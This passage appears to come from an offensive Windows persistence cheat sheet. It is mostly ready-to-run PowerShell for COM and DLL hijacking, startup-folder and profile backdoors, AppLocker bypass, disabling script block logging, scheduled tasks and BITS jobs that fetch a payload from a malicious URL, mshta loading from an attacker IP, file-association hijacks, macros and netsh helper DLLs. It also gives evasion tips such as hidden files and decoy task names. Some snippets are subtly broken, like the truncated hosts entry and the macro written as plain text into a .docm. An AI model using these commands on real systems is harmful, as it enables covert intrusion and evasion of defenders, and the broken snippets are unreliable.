Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{<GUID>}\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
```
Explanation:
- `{<GUID>}`: Replace with a valid CLSID for the new or hijacked COM object.
- `InprocServer32`: Specifies the path to the DLL that will be loaded by the COM object.
- `ThreadingModel`: Specifies the threading model (e.g., "Apartment") used by the COM object.

#### Hijack an Existing COM Object for Persistence
Hijacking involves modifying an existing COM object to point to a malicious payload, such as a DLL or an executable. This method can be used to intercept legitimate COM invocations and redirect them to malicious code.
Example of redirecting the `LocalServer32` key for a COM object to execute a malicious executable:
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{<GUID>}' -Name 'LocalServer32' -Value 'C:\path\to\malicious.exe'
```
This tells the system to execute the specified malicious executable whenever the COM object is invoked.

#### Hijacking Trusted DLLs in System Paths
Hijacking trusted DLLs involves replacing or placing a malicious DLL in a location that a legitimate application will load during execution. This can be effective if a writable directory exists in the search path of a trusted application:
1. Identify the target application that loads a DLL from a writable directory.
2. Replace the legitimate DLL with a malicious DLL:
```powershell
Copy-Item -Path "C:\path\to\malicious.dll" -Destination "C:\Program Files\TargetApp\legit.dll" -Force
```

#### COM Hijacking for DCOM Objects
DCOM (Distributed COM) objects are also vulnerable to hijacking. You can modify DCOM settings similarly to local COM objects, causing them to load malicious payloads. Here's an example of hijacking a DCOM object for persistence by executing `powershell.exe`:
```powershell
$regPath = "HKCU:\Software\Classes\CLSID\{<GUID>}\InprocServer32"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "powershell.exe"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
```
- `(Default)` is set to `powershell.exe`, which executes when the DCOM object is triggered.
- `ThreadingModel` ensures the COM object runs in the appropriate threading environment (in this case, single-threaded "Apartment").

#### Modifying COM Objects for Malicious Script Execution
Another method involves modifying COM objects responsible for launching executables to point to a PowerShell command or script:
```powershell
$regPath = "HKCU:\Software\Classes\exefile\shell\open\command"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>"
```
This command will execute the malicious script or command when an executable file is run.

#### Hijacking an Existing CLSID for DLL Execution
You can hijack a CLSID of a legitimate COM object and modify its properties to load a malicious DLL. This forces the system to load your malicious DLL instead of the intended one:
```powershell
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{<GUID>}\InProcServer32" -Name "(Default)" -Value "C:\path\to\malicious.dll"
```
This will execute the malicious DLL whenever the system or an application attempts to invoke this CLSID.

#### Example - Hijack COM Object for Persistence
Hijack a CLSID of a commonly used COM object (such as that of an Office application) and point it to a malicious DLL:
```powershell
$regPath = "HKCU:\Software\Classes\CLSID\{00020813-0000-0000-C000-000000000046}\InprocServer32"  # Example CLSID for Excel Application
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\path\to\malicious.dll"
```
Whenever the Excel COM object is invoked, your DLL will be executed.

# Startup Folders

#### Locating Startup Folders
If a user or group has write access to a startup folder, you can add a malicious executable that will automatically run when the system starts.
- For current user startup (this applies only to the logged-in user):
    ```powershell
    $StartupFolder = $env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup"
    Write-Host "Current User Startup Folder: $StartupFolder"
    ```
- For all users startup (this applies to all users on the machine):
    ```powershell
    $StartupFolderAllUsers = $env:ALLUSERSPROFILE + "\Microsoft\Windows\Start Menu\Programs\Startup"
    Write-Host "All Users Startup Folder: $StartupFolderAllUsers"
    ```

#### Dropping a Payload in the Startup Folder
If you have write access to the appropriate startup folder, you can drop a malicious executable or script that will be executed when the system starts or when a user logs in.
- Copy an Executable to the Current User's Startup Folder:
	```powershell
	Copy-Item "<path_to_executable>" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.exe"
	```
- Copy an Executable to the All Users' Startup Folder:
	```powershell
	Copy-Item "<path_to_executable>" "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.exe"
	```

This method places the executable in the startup folder, which ensures it runs whenever the target user or any user logs into the system.

#### Create a Shortcut for the Current User's Startup Folder
Instead of placing the executable directly in the startup folder, you can create a shortcut (`.lnk` file) that points to the malicious executable. This allows for greater flexibility in pointing to external paths and makes the persistence method less obvious.
- Create a Malicious Shortcut Using PowerShell:
	```powershell
	$WshShell = New-Object -ComObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.lnk")
	$Shortcut.TargetPath = "C:\Path\To\Malicious\backdoor.exe"
	$Shortcut.WorkingDirectory = "C:\Path\To\Malicious\"
	$Shortcut.WindowStyle = 7  # Minimized window
	$Shortcut.Description = "System Utility"
	$Shortcut.Save()
	```

#### Create a Shortcut for the All Users' Startup Folder
- Create a Shortcut for All Users:
	```powershell
	$WshShell = New-Object -ComObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut("$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.lnk")
	$Shortcut.TargetPath = "C:\Path\To\Malicious\backdoor.exe"
	$Shortcut.WorkingDirectory = "C:\Path\To\Malicious\"
	$Shortcut.WindowStyle = 7
	$Shortcut.Description = "System Utility"
	$Shortcut.Save()
	```

#### Hide Executable with Hidden Attributes
To further evade detection, the executable or shortcut file in the startup folder can be hidden using file attributes:
- Set Hidden and System File Attributes:
	```powershell
	$MaliciousFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.exe"
	Set-ItemProperty -Path $MaliciousFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
	```

#### Verifying Persistence
After placing the malicious executable or shortcut in the startup folder, you can verify that it will indeed execute on the next startup by listing the contents of the startup folder:
- List Items in the Startup Folder (Current User):
	```powershell
	Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
	```
- List Items in the Startup Folder (All Users):
	```powershell
	Get-ChildItem "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup"
	```

#### Additional Considerations
- Script Persistence: You can place PowerShell or batch scripts in the startup folder as well, which will execute automatically during startup. Example:
	```powershell
	Copy-Item "C:\path\to\payload.ps1" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_script.ps1"
	```

# PowerShell Profile
PowerShell profiles are scripts that are executed automatically whenever a new PowerShell session starts. These can be exploited to establish persistence by modifying them to execute arbitrary code. There are four types of profiles, but the most commonly used for persistence are the user-specific and system-wide profiles:

- User Profile: `$PROFILE` (This is user-specific and located at `C:\Users\<Username>\Documents\WindowsPowerShell\profile.ps1`)
- System-Wide Profile: `"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"` (This applies to all users on the system)

#### View User-Specific PowerShell Profile
This command shows the content of the current user's PowerShell profile, typically located in `C:\Users\<Username>\Documents\WindowsPowerShell\profile.ps1`.
```powershell
Get-Content -Path "$PROFILE"
```

#### Create a New User-Specific PowerShell Profile
If the PowerShell profile does not exist, you can create one. This creates a new profile for the current user if it doesn’t already exist. The `-Force` flag ensures the file is created even if directories in the path don’t exist.
```powershell
New-Item -Path "$PROFILE" -Force
```

#### Modify User-Specific PowerShell Profile for Persistence
This adds a command to the user's profile to run an executable or script whenever a PowerShell session starts. 
```powershell
Add-Content -Path "$PROFILE" -Value "Start-Process 'C:\Backdoor\backdoor.exe' -WindowStyle Hidden"
```
The `Start-Process` cmdlet runs the backdoor executable in the background, minimizing its visibility.

#### Disable PowerShell Script Block Logging (Evasion)
To evade detection, attackers may disable PowerShell script block logging, which records details of PowerShell commands and scripts. Disabling it through the registry helps avoid being logged.
```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

#### Persist via PowerShell ScriptBlock (User Level)
ScriptBlocks allow you to register an action or script to execute on specific events, such as exiting a session. This registers an event that triggers a PowerShell script or executable when the user’s PowerShell session exits.
```powershell
Register-ObjectEvent -InputObject $host -EventName Exiting -Action {Start-Process -NoNewWindow -FilePath "C:\path\to\program.exe"} -MessageData "SessionExitEvent"
```
This ensures that when the session is terminated, the backdoor process is re-executed.

#### Fileless Persistence
One of the most effective evasion techniques is fileless persistence. By not creating any additional files on disk, the attacker minimizes their footprint, making detection more difficult. PowerShell can be leveraged to achieve fileless persistence by manipulating in-memory objects or settings such as environment variables, registry keys, or using ScriptBlocks as demonstrated above.

Example: Using the Windows registry to persist PowerShell commands:
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PowerShellPersistence" -Value "powershell.exe -WindowStyle Hidden -Command 'Start-Process C:\Backdoor\backdoor.exe'"
```
- Explanation: This sets a registry key that will automatically launch the backdoor upon user login.

# AppLocker Bypass and Persistence

AppLocker, when configured, restricts executable and script execution based on predefined policies. However, by invoking PowerShell with certain parameters, it’s possible to bypass the execution restrictions. Here’s how you can do it:

#### Bypass AppLocker by Running a Script
This command runs a PowerShell script while bypassing AppLocker’s execution policy, allowing you to execute malicious scripts:
```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "<path_to_malicious_script>"
```

#### Modify AppLocker Enforcement via Registry
AppLocker settings are often enforced through Group Policy and stored in the registry. Modifying certain registry values can disable or weaken AppLocker’s enforcement. However, direct tampering with these keys may require administrator privileges and is easily detectable by monitoring solutions. 

This command changes the AppLocker policy to disable enforcement, allowing you to run otherwise restricted applications:
```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Exe" -Name "EnforcementMode" -Value 0
```
- Explanation:
    - `-Path`: Points to the AppLocker settings in the registry.
    - `-Name "EnforcementMode"`: This key controls whether AppLocker rules are enforced (`1` for Enforced, `0` for Audit Mode).
    - `-Value 0`: Switches AppLocker to Audit Mode, meaning it will no longer block application execution but only log it.

- Important: This requires administrative privileges, and it's highly detectable. You should pair this with a stealthier persistence mechanism.

#### Create a COM Object Shortcut for Persistence
COM objects provide a way to create shortcuts and tasks that can be run during startup, often bypassing AppLocker since COM-based execution is not always restricted by AppLocker policies. By creating a shortcut to a malicious script in the user’s startup folder, you can ensure persistence across reboots.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persistence.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command <command_or_script_path>"
$shortcut.Save()
```
- Explanation:
    - `$wsh = New-Object -ComObject WScript.Shell`: Creates a COM object to interact with the Windows Shell, allowing you to create shortcuts.
    - `$shortcut.CreateShortcut("<path_to_shortcut>")`: Creates a shortcut at the specified path (`Startup` folder in this case, for persistence).
    - `$shortcut.TargetPath`: Specifies the executable to run (`powershell.exe` here).
    - `$shortcut.Arguments`: Sets PowerShell arguments to run your script while bypassing AppLocker and without displaying a window.

- Result: Upon reboot, PowerShell will run the specified script from the Startup folder, ensuring persistence.

#### Using Trusted Locations to Bypass AppLocker
Some directories, such as `C:\Windows\System32\`, `C:\Windows\Tasks\`, or `C:\Windows\Temp\`, may be whitelisted in AppLocker policies. Placing your malicious script in these directories could bypass restrictions.

```powershell
Copy-Item -Path "C:\Temp\malicious_script.ps1" -Destination "C:\Windows\Temp\malicious_script.ps1"
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "C:\Windows\Temp\malicious_script.ps1"
```

#### Create a Scheduled Task for Persistence:
AppLocker often allows execution of scheduled tasks. By creating a scheduled task to execute your PowerShell script, you can bypass AppLocker and establish persistence:

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Temp\persistence_script.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "System Update Task"
```
- Explanation:
    - `New-ScheduledTaskAction`: Specifies the action to run a PowerShell script with execution policy bypass.
    - `New-ScheduledTaskTrigger -AtStartup`: Sets the task to run at system startup.
    - `Register-ScheduledTask`: Registers the scheduled task with a custom name and description.

# BITS Jobs (Background Intelligent Transfer Service)

#### Create a Persistent BITS Job
- This script creates a BITS job that downloads a malicious script at system startup and executes it using Task Scheduler. BITS jobs are often used to transfer files in the background, making it a subtle way to download malicious payloads persistently.

```powershell
# Create BITS job to download malicious script
$job = Start-BitsTransfer -Source "<malicious_url>" -Destination "$env:TEMP\malicious_script.ps1" -Description "Persistence Job"

# Register scheduled task to run the downloaded script at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File $env:TEMP\malicious_script.ps1"
Register-ScheduledTask -TaskName "PersistentBITS" -Trigger $trigger -Action $action -User "SYSTEM" -RunLevel Highest
```

#### Modify Existing BITS Job
- Modify an existing BITS job to include the download of a malicious script and ensure it is transferred.

```powershell
# Identify the existing BITS job by description
$job = Get-BitsTransfer -AllUsers | Where-Object {$_.Description -eq "<job_description>"}

# Add the malicious file to the existing BITS job
Add-BitsFile -BitsJob $job -RemoteName "<malicious_url>" -LocalName "$env:TEMP\malicious_script.ps1"

# Complete the transfer to ensure the malicious file is downloaded
Complete-BitsTransfer -BitsJob $job
```

# Software Updaters

#### Hijack Software Updater
- Modifies software updater to include a malicious script:
	```powershell
	$updaterPath = "C:\Program Files\TargetApp\Updater.exe"
	Copy-Item "<path_to_malicious_script>" -Destination "$updaterPath"
	```

# File Association Hijacking (Persistence)

File Association Hijacking can be used for persistence by modifying the way specific file types are opened, redirecting them to malicious executables or scripts. This method targets how the operating system handles file types, making it run the attacker's code when a particular file type is opened. This approach is persistent as the registry settings are applied at user login and persist across reboots, as long as the registry entries are not modified.

#### View Current File Associations for a Specific Extension
- To view the current program or command associated with a specific file extension, such as `.txt`, use the following PowerShell command:
	```powershell
	Get-ItemProperty -Path 'HKCU:\Software\Classes\.txt'
	```
This will display the current association of the `.txt` extension. The default value typically indicates what class (e.g., `txtfile`) is used to handle files with that extension.

#### Change File Association to a Malicious Executable
- To modify the file association of a specific extension (like `.txt`), you can set it up so that when a user opens a `.txt` file, it executes a malicious payload such as a backdoor. Here’s how to modify the association:

1. Step 2.1: Ensure the file type (e.g., `txtfile`) is mapped correctly to the file extension:
    ```powershell
    New-ItemProperty -Path 'HKCU:\Software\Classes\.txt' -Name '(Default)' -Value 'txtfile' -Force
    ```

2. Step 2.2: Redirect the command that is executed when the file is opened. This can be set to launch a malicious executable:
    ```powershell
    Set-ItemProperty -Path 'HKCU:\Software\Classes\txtfile\shell\open\command' -Name '(Default)' -Value 'C:\Backdoor\backdoor.exe'
    ```

In this example, any `.txt` file opened by the user will trigger the execution of `C:\Backdoor\backdoor.exe`. This can be replaced by any malicious script or binary.

#### Notes
- Persistence Mechanism: This approach is persistent as the registry settings are applied at user login and persist across reboots, as long as the registry entries are not modified.
  
- Scope: The changes above are made in the user’s registry hive (`HKCU`), meaning the hijacking affects only the current user. To apply this globally across all users, modify `HKLM` (Local Machine):
    ```powershell
    New-ItemProperty -Path 'HKLM:\Software\Classes\.txt' -Name '(Default)' -Value 'txtfile' -Force
    Set-ItemProperty -Path 'HKLM:\Software\Classes\txtfile\shell\open\command' -Name '(Default)' -Value 'C:\Backdoor\backdoor.exe'
    ```

# Office Macros

#### Add a Malicious Macro in Office Document
- Use `Set-Content` to inject a malicious VBA macro into an Office document for execution on open.
	```powershell
	$macroCode = 'Sub AutoOpen() Shell("powershell.exe -ExecutionPolicy Bypass -File C:\Backdoor\backdoor.ps1") End Sub'
	Set-Content -Path "C:\Documents\malicious.docm" -Value $macroCode
	```

#### Embed Malicious Macro in Office Document
- Embeds a malicious macro in an Office document:
	```vb
	$macro = @"
	Sub AutoOpen()
	    Shell "powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>"
	End Sub
	"@
	$macro | Set-Content -Path "<path_to_office_document>"
	```

#### Persist via Office Template Injection
- Modifies the Office template to include a malicious macro:
	```powershell
	Copy-Item "<path_to_malicious_template>" -Destination "$env:APPDATA\Microsoft\Templates\Normal.dotm" -Force
	```

# DNS and Name Resolution

#### Persist via DNS Hijacking
- Modifies the DNS settings for persistence:
	```powershell
	Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses ("<malicious_dns_ip>")
	```

#### Persist via Host File Modification
- Modifies the host file to include malicious redirection:
	```powershell
	Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0 malicious_site.com"
	```

# MSHTA and HTML Applications (HTA) Persistence

#### Persist via MSHTA
- Uses MSHTA to execute a script for persistence:
	```powershell
	Start-Process mshta.exe "http://<attacker_ip>/malicious.hta"
	```

#### Persist via Local HTA File
- Creates a local HTA file for persistence:
	```
	$htaContent = @"
	<script>
	    var shell = new ActiveXObject("WScript.Shell");
	    shell.Run("powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>");
	    window.close();
	</script>
	"@
	$htaContent | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious.hta"
	```

# External Drives and Autorun

#### Create `autorun.inf` for USB Drives
- USB drives that contain an `autorun.inf` file can automatically run executables when inserted (on older systems).
	```powershell
	Set-Content -Path "D:\autorun.inf" -Value "[autorun]`nopen=backdoor.exe"
	```

#### Modify Existing Autorun Files
- Edit or append to existing `autorun.inf` files to add your backdoor.
	```powershell
	Add-Content -Path "D:\autorun.inf" -Value "`nopen=C:\Backdoor\backdoor.exe"
	```

# Application Shimming

#### Persist via Application Shimming
- Creates an application shim for persistence:
	```
	$shim = @"
	$shimguid = '{<shim_guid>}'
	$shimpath = "$env:TEMP\shim.exe"
	$cmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>"
	$shimcmd = "$shimpath /db $env:TEMP\shim.sdb /gui /quiet"
	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "$shimguid"
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\$shimguid" -Name "CustomDLL" -Value "$cmd"
	"@
	$shim | Out-File -FilePath "$env:TEMP\malicious_shim.ps1"
	powershell.exe -NoProfile -WindowStyle Hidden -File "$env:TEMP\malicious_shim.ps1"
	```

# Scheduled Workflows

#### Create a Workflow Task
- Creates a workflow task for persistence:
	```
	$workflowContent = @"
	workflow PersistentWorkflow {
	    while ($true) {
	        InlineScript {
	            powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>
	        }
	        Start-Sleep -Seconds 3600
	    }
	}
	PersistentWorkflow
	"@
	$workflowContent | Out-File -FilePath "$env:APPDATA\PersistentWorkflow.ps1"
	powershell.exe -NoProfile -WindowStyle Hidden -File "$env:APPDATA\PersistentWorkflow.ps1"
	```

# Miscellaneous

#### Browser Extensions
- Install a malicious browser extension that loads every time the browser is started.
	```powershell
	$path = "$env:APPDATA\Google\Chrome\User Data\Default\Extensions\MaliciousExtension"
	New-Item -ItemType Directory -Path $path
	Set-Content -Path "$path\manifest.json" -Value '{ "name": "MaliciousExtension", "version": "1.0", "permissions": ["<all_urls>"], "background": { "scripts": ["background.js"] } }'
	```

#### View Registered `Netsh` Helpers
- To view registered `netsh` helpers:
	```powershell
	netsh show helper
	```

#### `Netsh` Helper DLL
- You can use `netsh` to register a malicious DLL that will be loaded whenever certain network-related commands are run.
	```powershell
	netsh add helper C:\Backdoor\backdoor.dll
	```
